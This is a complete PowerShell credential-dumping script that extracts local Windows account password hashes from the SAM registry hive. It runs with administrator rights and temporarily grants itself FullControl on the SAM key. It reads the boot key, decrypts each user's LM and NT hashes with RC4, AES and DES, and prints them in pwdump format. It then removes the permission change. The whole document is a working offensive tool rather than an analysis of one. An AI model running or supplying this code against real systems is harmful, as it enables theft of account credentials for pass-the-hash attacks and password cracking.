[CmdletBinding()]param()

$PowerDump = $null

# Constants for SAM decrypt algorithm
$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$emptyLm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$emptyNt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$oddParity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function LoadApi{
    # https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/27/use-powershell-to-interact-with-the-windows-api-part-3/
    $DynAssembly = New-Object System.Reflection.AssemblyName
    $DynAssembly.Name = "Win32Lib"
    $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    if($Host.version.Major -eq 7){$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib')} #powershell-version -> 7.x.y
    else{$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $false)}
    
    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')

    ####
    # [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegOpenKeyEx',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
    )
    $FieldValueArray = [Object[]] @(
        'RegOpenKeyEx',
        [Runtime.InteropServices.CharSet]::Auto
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ####
    #[DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegQueryInfoKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegQueryInfoKey',
        [Runtime.InteropServices.CallingConvention]::Winapi,
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ####
    #[DllImport("advapi32.dll", SetLastError=true)]
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegCloseKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegCloseKey',
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ####
    
    $script:PowerDump = $TypeBuilder.CreateType()
}


function Get-BootKey{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | ForEach-Object{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $bootkey = New-Object byte[] $($s.Length/2);
    0..$($bootkey.Length-1) | ForEach-Object{$bootkey[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    # $b2 = New-Object byte[] 16;
    # 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    # return ,$b2;
    $p = @(0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7)
    $scrambledBootkey = [byte[]]::new(0)
    foreach ($i in 0..($bootkey.Length - 1)) {
        $scrambledBootkey += $bootkey[$p[$i]..($p[$i])]
    }

    return $scrambledBootkey
}

function Get-HBootKey{
    param([byte[]]$bootkey);
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");

    $k = Get-Item HKLM:\SAM\SAM\Domains\Account; #SAM Reg
    if (!($k)) {return $null}
    [byte[]]$F = $k.GetValue("F");
    if (-!($F)) {return $null}

    $revision = [byte[]]$F[0x00..0x01] | Select -First 1
    Write-Debug "hbootkey_revision:$revision"

    switch ($revision) {
        2 { # => RC4 
            # $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
            $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x80] + $aqwerty + $bootkey + $anum);
            $rc4 = NewRC4 $rc4key;
            # return ,($rc4.encrypt($F[0x80..0x9F]));
            return ,($rc4.encrypt($F[0x80..0xA0]));
        }
        3 { # Windows 10 v1607 ~ => AES(Mode:CBC)
            $iv = [byte[]]$F[0x78..0x87]
            $encryptedHBootKey = [byte[]]$F[0x88..0xA7]
            $cipher = [System.Security.Cryptography.Aes]::Create()
            $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $cipher.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            $cipher.BlockSize = 128
            $cipher.Key = $bootkey
            $cipher.IV = $iv
            $decryptor = $cipher.CreateDecryptor()
            $hbootkey = $decryptor.TransformFinalBlock($encryptedHBootKey, 0, $encryptedHBootKey.Length)
        
            return $hbootkey[0..15]
        }
        Default {Write-Error "Get-hbootkey()"}
    }

}

function Get-UserName {
    param([byte[]]$V) 
    if ($V) { 
        $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
        $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
        return [Text.Encoding]::Unicode.GetString($V, $offset, $len); 
    } 
    else{return $null}
}


function NewRC4([byte[]]$key)
{
    return New-Object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (!($this.S))
        {
            [byte[]]$this.S = 0..255;
            0..255 | ForEach-Object -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = New-Object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | ForEach-Object -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt {param([byte[]]$data, [byte[]]$key) return ,(des_transform $data $key $true) }

function des_decrypt {param([byte[]]$data, [byte[]]$key) return ,(des_transform $data $key $false) }

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt) { 
    $des = new-object Security.Cryptography.DESCryptoServiceProvider; 
    $des.Mode = [Security.Cryptography.CipherMode]::ECB; 
    $des.Padding = [Security.Cryptography.PaddingMode]::None; 
    $des.Key = $key; 
    $des.IV = $key; 
    if ($doEncrypt -eq $true) { return ,($des.CreateEncryptor().TransformFinalBlock($data, 0, $data.Length)); } 
    else { return ,($des.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)); } 
}

function Get-RegKeyClass([string]$key, [string]$subkey){
    switch ($Key) {
        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default {
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (!($script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey)))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (!($script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0)))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}
    	$script:PowerDump::RegCloseKey($hkey) > $null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-UserKeys{
    (Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users).where{$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
            # Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0xa8..$(0xa8+4)],0) + 0xCC} -PassThru
}


function DecryptHashes { 
    param($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey,[byte[]]$salt)
    [byte[]]$lmHash = $emptyLm; [byte[]]$ntHash=$emptyNt; 
    # LM Hash 
    if ($enc_lm_hash) { 
        switch ($salt) {
            $null {$lmHash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;}
            Default {$lmHash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword $salt;}
        }
    }
    # NT Hash
    if($enc_nt_hash){
        switch ($salt) {
            $null {$ntHash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;}
            Default {$ntHash = DecryptSingleSaltedHash $rid $hbootkey $enc_nt_hash $antpassword $salt;}
        }  
    }
    return ,($lmHash,$ntHash)
}

function DecryptSingleHash {
    param ($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
    # Generate two DES keys from the RID 
    $desKeys = sid_to_key $rid
    # Create an MD5 hash object
    $md5 = [Security.Cryptography.MD5]::Create()
    # Compute the RC4 key from the hbootkey, RID and lmntstr
    $rc4Key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr)
    # Create an RC4 cipher object with the RC4 key
    $rc4 = NewRC4 $rc4Key
    # Encrypt the encrypted hash with the RC4 cipher to get the obfuscated key
    $obfKey = $rc4.encrypt($enc_hash)
    # Decrypt the obfuscated key with the two DES keys to get the hash
    $hash = (des_decrypt  $obfKey[0..7] $desKeys[0]) + (des_decrypt $obfKey[8..$($obfKey.Length - 1)] $desKeys[1])
    # Return the hash as output
    return ,$hash
}

function DecryptSingleSaltedHash{
    param($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr,[byte[]]$nt_salt)

    $desKeys = sid_to_key $rid

    $cipher = [System.Security.Cryptography.Aes]::Create()
    $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $cipher.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $cipher.BlockSize = 128
    $cipher.Key = $hbootkey
    $cipher.IV = $nt_salt
    $decryptor = $cipher.CreateDecryptor()
    $obfkey = [byte[]]::new($enc_hash.Length)
    $obfkey = $decryptor.TransformFinalBlock($enc_hash, 0, $enc_hash.Length)

    $hash = (des_decrypt  $obfKey[0..7] $desKeys[0]) + (des_decrypt $obfKey[8..15] $desKeys[1])
    return ,$hash
}

function sid_to_key{
    param($sid)
    $c0 = $sid -band 255
    $c1 = ($sid -band 65280)/256
    $c2 = ($sid -band 16711680)/65536
    $c3 = ($sid -band 4278190080)/16777216

    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

    return ,((str_to_key $s1),(str_to_key $s2))
}

function str_to_key{
    param($s)
    $k0 = [int][Math]::Floor($s[0] * [float][Math]::Pow(1/2,1))
    $k1 = ( $($s[0] -band 0x01) * [int][Math]::Pow(2,6)) -bor [int][Math]::Floor($s[1] * [float][Math]::Pow(1/2,2))
    $k2 = ( $($s[1] -band 0x03) * [int][Math]::Pow(2,5)) -bor [int][Math]::Floor($s[2] * [float][Math]::Pow(1/2,3))
    $k3 = ( $($s[2] -band 0x07) * [int][Math]::Pow(2,4)) -bor [int][Math]::Floor($s[3] * [float][Math]::Pow(1/2,4))
    $k4 = ( $($s[3] -band 0x0F) * [int][Math]::Pow(2,3)) -bor [int][Math]::Floor($s[4] * [float][Math]::Pow(1/2,5))
    $k5 = ( $($s[4] -band 0x1F) * [int][Math]::Pow(2,2)) -bor [int][Math]::Floor($s[5] * [float][Math]::Pow(1/2,6))
    $k6 = ( $($s[5] -band 0x3F) * [int][Math]::Pow(2,1)) -bor [int][Math]::Floor($s[6] * [float][Math]::Pow(1/2,7))
    $k7 = $($s[6] -band 0x7F)

    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

    0..7 | ForEach-Object{
        $key[$_] = $oddParity[($key[$_] * 2)]
    }

    return ,$key
}

function Get-UserHashes{
    param($u, [byte[]]$hbootkey)
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    
    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
    $LM_exists = $false;
    $NT_exists = $false;
    # LM header check
    $isLm = $u.V[$(0x9c+4)..$(0x9c+8)][0]
    $isNt = $u.V[$(0x9c+16)..$(0x9c+20)][0]

    # LM header check
    if (($isLm -eq 20) -or ($isLm -eq 56)){
        $LM_exists = $true;
    }
    # NT header check
    if (($isNt -eq 20) -or ($isNt -eq 56)){
        $NT_exists = $true;
    }

    $hash_offset = $u.HashOffset
    $lm_offset_bytes = $u.V[0x9c..0x9f]
    $nt_offset_bytes = $u.V[$(0x9c+12)..$(0x9c+15)]
    $lm_offset = [BitConverter]::ToUInt32($lm_offset_bytes, 0) + 204
    $nt_offset = [BitConverter]::ToUInt32($nt_offset_bytes, 0) + 204
    
    Write-Debug "isLm: $LM_exists,isNt: $NT_exists"
    Write-Debug "hash_offset: $hash_offset"
    Write-Debug "lm_offset_bytes: $lm_offset_bytes"
    Write-Debug "nt_offset_bytes: $nt_offset_bytes"
    Write-Debug "lm_offset: $lm_offset"
    Write-Debug "nt_offset: $nt_offset"

    # LM
    if ($LM_exists -eq $true){
        $salt = $null
        switch ($u.V[$($lm_offset+2)..$($lm_offset+3)][0]) { #Lm Revision
            1 {
                $enc_lm_hash = $u.V[$($lm_hash_offset+20)..$($lm_hash_offset+52)];
            }
            2 { $salt = $u.V[$($lm_hash_offset+4)..$($lm_hash_offset+20)];
                $enc_lm_hash = $u.V[$($lm_hash_offset+20)..$($lm_hash_offset+52)];
            }
            default {}
        }
        Write-Debug "lm_salt:$salt"
        Write-Debug "enc_lm_hash:$enc_lm_hash"
    }

    #NT
    if ($NT_exists -eq $true){
        # $nt_salt = $null
        $salt = $null

        switch ($u.V[$($nt_offset+2)..$($nt_offset+3)][0]) { #Nt Revision
            1 {
                $enc_nt_hash = [byte[]]$u.V[$($nt_offset+4)..$($nt_offset+20)]
            }
            2 {
                $salt = [byte[]]$u.V[$($nt_offset+8)..$($nt_offset+(24-1))]
                $enc_nt_hash = [byte[]]$u.V[$($nt_offset+24)..$($nt_offset+(56-1))]
            }
            Default {Write-Error "nt_revision"}
        }
        Write-Debug "nt_salt:$salt"
        Write-Debug "enc_nt_hash:$enc_nt_hash"
    }

    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey $salt);
    
}

function Set-RegPermissions {
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
    "FullControl",
    [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
    [System.Security.AccessControl.PropagationFlags]"None",
    [System.Security.AccessControl.AccessControlType]"Allow")
    $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SAM\SAM\Domains",
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
    $acl = $key.GetAccessControl()
    $acl.SetAccessRule($rule)
    $key.SetAccessControl($acl)
    Write-Debug "[+] Set Access permissions -> SAM\SAM\Domains registry hive"
    return $acl
}
function Remove-RegPermissions {
    param([System.Security.AccessControl.NativeObjectSecurity]$acl)
    #Remove the permissions added Set-RegPermissions().
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    if($acl.Access.where{$_.IdentityReference.Value -eq $user} | ForEach-Object{$acl.RemoveAccessRule($_)}){
        # Write-Output "[+] Remove Access permissions -> SAM\SAM\Domains registry hive"
        Write-Debug "[+] Remove Access permissions -> SAM\SAM\Domains registry hive"
    }
    Set-Acl HKLM:\SAM\SAM\Domains $acl
}

function DumpHashes{
    LoadApi
    $bootkey = Get-BootKey;
    $hbootKey = Get-HBootKey $bootkey;
    
    Write-Debug "bootkey: $bootkey"
    Write-Debug "hbootkey: $hbootkey"  

    Write-Output "[userName]:[Rid]:[LMHASH]:[NTHASH]:::"
    $userKeys = Get-UserKeys;
    foreach($userKey in $userKeys){
        $hashes = Get-UserHashes $userKey $hBootKey;
        if($PSObjectFormat){
            $creds = New-Object psobject
            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $userKey.Username
            $creds | Add-Member -MemberType NoteProperty -Name id -Value $userKey.Rid
            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
            $creds
        }
        else{
            "{0}:{1}:{2}:{3}:::" -f ($userKey.UserName,$userKey.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
        }
    }
}


# Main
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true) { # isAdministrator
    [System.Security.AccessControl.NativeObjectSecurity]$acl = Set-RegPermissions
    DumpHashes
    Remove-RegPermissions $acl
}else{
    Write-Error "Run the Command as an Administrator" 
    Break 
}